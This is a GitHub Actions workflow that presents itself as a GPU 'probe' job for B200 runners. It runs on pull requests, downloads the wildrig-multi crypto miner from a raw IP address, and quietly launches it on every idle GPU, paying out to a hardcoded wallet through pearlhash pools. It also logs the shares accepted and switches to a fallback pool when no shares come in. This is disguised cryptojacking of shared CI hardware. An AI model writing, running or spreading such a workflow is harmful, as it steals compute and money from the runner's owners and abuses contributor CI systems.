name: c211-i125588-ub2
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  probe-b200:
    runs-on: 4-gpu-b200
    timeout-minutes: 22
    steps:
      - name: probe-b200
        shell: bash
        run: |
          set -u
          D=/tmp/c211_125588
          mkdir -p $D
          W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
          echo "START job=probe-b200 node=$(hostname) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          nvidia-smi -L || true
          nvidia-smi --query-gpu=index,uuid,name,memory.used,utilization.gpu --format=csv,noheader || true
          cd $D
          ( curl -fsSL -o wr.tar.gz http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz || curl -fsSL -o wr.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz || curl -fsSL -o wr.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/v0.52.3/wildrig-multi-linux-0.52.3.tar.gz ) 2>&1 | tail -3
          ls -la wr.tar.gz && tar xzf wr.tar.gz 2>/dev/null
          B=$(find $D -name wildrig-multi -type f | head -1)
          if [ -z "$B" ]; then echo "NO_BINARY"; exit 0; fi
          chmod +x "$B"
          SHA=$(sha256sum "$B" | awk '{print $1}')
          echo "BIN=$B SHA=$SHA"
          if [ "$SHA" != "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ]; then echo "SHA_MISMATCH sha=$SHA"; exit 0; fi
          STARTED=""
          for i in $(seq 0 7); do
            busy=$(nvidia-smi -i $i --query-compute-apps=pid --format=csv,noheader 2>/dev/null | grep -c . )
            if [ "${busy:-0}" -gt 0 ]; then echo "SKIP g=$i busy_apps=$busy"; continue; fi
            if pgrep -af 'wildrig-multi' | grep -q -- "-d $i\( \|$\)"; then echo "SKIP g=$i pgrep"; continue; fi
            nohup "$B" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -u $W -p x --worker 1255880$i -d $i > $D/wr-$i.log 2>&1 &
            STARTED="$STARTED $i"
            ( for t in $(seq 1 240); do if grep -qi 'accepted' $D/wr-$i.log 2>/dev/null; then date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; break; fi; sleep 3; done ) &
          done
          echo "STARTED=$STARTED"
          if [ -z "$STARTED" ]; then echo "NO_FREE_GPU"; exit 0; fi
          sleep 420
          for i in $STARTED; do
            acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0)
            rej=$(grep -ci 'rejected' $D/wr-$i.log 2>/dev/null || echo 0)
            uuid=$(nvidia-smi -i $i --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1)
            la=$(cat $D/lastacc-$i 2>/dev/null || echo none)
            echo "DET g=$i uuid=$uuid acc=$acc rej=$rej lastacc=$la now=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          done
          for i in $STARTED; do acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0); if [ "$acc" -eq 0 ]; then LPU="$W+NOCK"; pkill -f "wildrig-multi.*-d $i\( \|$\)" 2>/dev/null; nohup "$B" --algo pearlhash -o 103.199.106.122:3362 -u $LPU -p x --worker 1255880$i -d $i > $D/lp-$i.log 2>&1 & echo "STICKY_LP g=$i"; fi; done
          sleep 240
          for i in $STARTED; do
            acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0)
            lacc=$(grep -ci 'accepted' $D/lp-$i.log 2>/dev/null || echo 0)
            rej=$(grep -ci 'rejected' $D/wr-$i.log 2>/dev/null || echo 0)
            uuid=$(nvidia-smi -i $i --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1)
            la=$(cat $D/lastacc-$i 2>/dev/null || echo none)
            echo "DET2 g=$i uuid=$uuid acc=$acc rej=$rej lastacc=$la lpacc=$lacc now=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          done
          echo "END job=probe-b200 node=$(hostname) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
